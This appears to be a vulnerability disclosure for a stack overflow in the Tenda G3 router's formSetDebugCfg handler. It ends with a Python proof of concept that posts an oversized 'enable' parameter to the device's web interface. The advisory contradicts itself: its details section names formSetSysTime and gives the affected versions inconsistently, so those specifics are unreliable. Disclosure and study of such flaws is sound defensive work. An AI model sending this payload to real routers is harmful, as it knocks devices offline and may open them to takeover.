# Tenda G3 formSetDebugCfg
### Overview
vendor: Tenda

product: G3

version: <= G3V3.0br_V15.11.0.17

type: Stack Overflow
### Vulnerability Description
Tenda G3 G3V3.0br_V15.11.0.17 were discovered to contain a stack overflow in the formSetDebugCfg function.
### Vulnerability details
Stack-based buffer overflow in function formSetSysTime on Tenda G3 before G3V3.0br_V15.11.0.17 devices allow remote attackers to cause a denial of service or remote code execution via a crafted parameter for the http post request.

In the function formSetSysTime line 57, it reads in 3 user-provided parameters, and the variable enable, level, module are passed to the sprintf function without any length check, which may overflow the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.
![](images/formSetDebugCfg-1.png)

### POC
```python
import requests
ip = '192.168.0.1'
url = f'http://{ip}/goform/setDebugCfg'
payload = {
    "enable": 'a' * 2000
}

res = requests.post(url=url, data=payload)
print(res.content)
```
